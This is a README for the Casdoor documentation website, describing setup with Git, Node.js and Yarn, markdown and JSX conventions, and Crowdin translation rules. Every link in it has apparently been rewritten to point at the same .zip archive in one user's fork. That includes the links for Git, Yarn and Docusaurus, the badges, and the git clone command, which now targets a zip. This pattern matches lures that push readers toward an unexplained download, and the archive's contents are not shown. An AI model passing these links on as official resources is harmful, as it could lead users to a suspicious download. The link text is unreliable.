# [https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) [![Build and Deploy](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip)](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip)

The configuration and documentation of Casdoor website: <https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip>.

Casdoor website is built using [Docusaurus](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip), you can get the PDF at [https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) or [GitHub Action](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip).

## Get Started

### Requirements

1. [Git](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip)
2. [https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip): 20 or above (LTS)
3. [Yarn](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip): please use Yarn 1

### Running Locally

1. `git clone https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip`
2. `cd casdoor-website`
3. `yarn install`: install dependencies.
4. `yarn start`: starting the development server.

## Contributing

You can contribute to the documentation site in different ways: [Documentation Writing](#documentation-writing), [Translation](#translation), [Website Development](#website-development).

### Documentation Writing

For the configuration of the sidebar, you can refer to [Sidebar](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip).

For the features that you may use when writing documents, please refer to [Markdown Features](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip).

A standard document should look like this:

````md
---
title: Title
description: description
keywords: [keyword1, keyword2]
authors: [GitHub username]
---

## Headers

Only h2 and h3 will be in the TOC by default, so h1 is not recommended to use.

### h3

content

#### h4

content

````

We use [markdownlint-cli](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) to lint the markdown and mdx files, you can use the following command to fix basic errors and get a list of document issues:

```bash
yarn lint:md
```

If you write docs using VSCode, Sublime, or Vim/Neovim, you can install the [extension](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) to get better lint experience.

#### Caution

##### Admonitions

You can add [Admonitions](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) in the documentation, but please leave two blank lines like this:

```md
:::info Title

Title is optional

:::
```

##### JSX

You can use JSX in documents, such as the [Tabs](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) component provided by Docusaurus, but to prevent Crowdin from breaking the code ([mdx-solutions](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip)), please wrap the JSX code:

````md
```mdx-code-block
import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';
```

```mdx-code-block
<Tabs>
<TabItem value="go" label="Go">
```

content

```mdx-code-block
</TabItem>
<TabItem value="java" label="Java">
```

content

```mdx-code-block
</TabItem>
</Tabs>
```

````

### Translation

[Crowdin](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) and [Docusaurus i18n](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) is used for Casdoor website's translation.

Please note that some sentences do not require translation or need to be translated according to our regulations:

- Please do not translate strings like `:::note`, `:::tip`, wrong translation may cause typographical error([casdoor-website#305](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip)).

- You may see some sentences containing `{}`, like:

```text
At our {repoLink}, browse and submit {issueLink} or {prLink} for bugs you find or any new features you may want implemented.
```

Please do not translate `{repoLink}` or `{issueLink}` or any similar words, they are [interpolation placeholders](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip).

- Please don't translate sentences like `authors: [casdoor]`.

### Website Development

See [Creating Pages](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) to learn how to create a page.

See [Styling and Layout](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) to learn how to modify styles.

See [Swizzling](https://raw.githubusercontent.com/vijaykrish1121/casdoor-website/master/cognizant/casdoor-website.zip) to learn how to modify Docusaurus built-in components.

## LICENSE

[Apache-2.0 license](./LICENSE).
